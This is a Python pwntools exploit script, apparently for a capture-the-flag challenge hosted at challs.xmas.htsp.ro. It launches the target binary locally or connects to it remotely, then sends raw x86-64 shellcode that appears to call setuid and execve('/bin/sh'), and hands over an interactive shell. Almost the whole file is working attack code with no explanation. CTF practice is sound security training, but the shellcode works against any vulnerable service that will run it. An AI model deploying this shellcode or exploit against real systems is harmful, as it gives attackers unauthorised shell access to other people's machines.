#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
__MODE__ = "PWN"
from rootkit import *
import os
import monkeyhex
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./chall')
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 2004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = start()

shellcode = b""
# shellcode = b"\xcc"
shellcode += b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"
re()
s(shellcode)
io.interactive()
